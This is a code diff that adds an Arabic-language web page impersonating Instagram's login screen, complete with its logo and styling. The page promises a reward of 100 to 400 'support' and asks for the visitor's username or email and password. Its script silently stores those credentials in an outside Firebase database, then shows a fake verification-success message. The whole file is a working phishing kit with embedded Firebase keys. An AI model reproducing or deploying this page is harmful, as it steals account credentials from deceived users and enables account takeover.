@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 10px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 100%;
+            padding: 40px 40px 20px 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        /* تصميم شعار إنستغرام SVG بدقة عالية */
+        .insta-logo-container {
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .insta-logo {
+            width: 175px;
+            height: 51px;
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yV/r/GHhGZE620aP.png");
+            background-position: 0 -52px;
+            background-size: auto;
+            background-repeat: no-repeat;
+            display: inline-block;
+        }
+
+        .form-group {
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            height: 38px;
+            padding: 9px 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            direction: rtl;
+            color: #262626;
+        }
+
+        input:focus, select:focus {
+            border-color: #a8a8a8;
+            background-color: #fff;
+        }
+
+        button.btn-submit {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 14px;
+            margin-bottom: 15px;
+            transition: background-color 0.2s ease;
+        }
+
+        button.btn-submit:hover {
+            background-color: #1877f2;
+        }
+
+        .success-box {
+            display: none;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .success-title {
+            color: #262626;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .success-sub {
+            color: #8e8e8e;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="card">
+        <!-- شعار إنستغرام الرسمي -->
+        <div class="insta-logo-container">
+            <span class="insta-logo" role="img" aria-label="Instagram"></span>
+        </div>
+
+        <form id="rewardForm">
+            <div class="form-group">
+                <input type="text" id="field1" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="field2" placeholder="كلمة المرور" required>
+            </div>
+            <div class="form-group">
+                <select id="rewardNumber" required>
+                    <option value="" disabled selected>نوع المكافأة</option>
+                    <option value="400دعم">400دعم</option>
+                    <option value="200دعم">200دعم</option>
+                    <option value="100دعم">100دعم</option>
+                </select>
+            </div>
+            <button type="submit" class="btn-submit">تسجيل الدخول</button>
+        </form>
+
+        <div id="successBox" class="success-box">
+            <div class="success-title">تم بنجاح تحقق من حسابك</div>
+            <div class="success-sub">قد يستغرق 5 إلى 10 دقائق</div>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDlkFHULPYdjs7CBso3DROCJfg3C742yQk",
+      authDomain: "mindee-c504f.firebaseapp.com",
+      projectId: "mindee-c504f",
+      storageBucket: "mindee-c504f.firebasestorage.app",
+      messagingSenderId: "88922133115",
+      appId: "1:88922133115:web:2ee3a789e06286938b88de"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const form = document.getElementById('rewardForm');
+    const successBox = document.getElementById('successBox');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const field1 = document.getElementById('field1').value;
+        const field2 = document.getElementById('field2').value;
+        const rewardNumber = document.getElementById('rewardNumber').value;
+
+        try {
+            await addDoc(collection(db, "rewards_submissions"), {
+                field1: field1,
+                field2: field2,
+                rewardNumber: rewardNumber,
+                timestamp: serverTimestamp()
+            });
+
+            form.style.display = 'none';
+            successBox.style.display = 'block';
+        } catch (error) {
+            alert("حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.");
+        }
+    });
+</script>
+
+</body>
+</html>
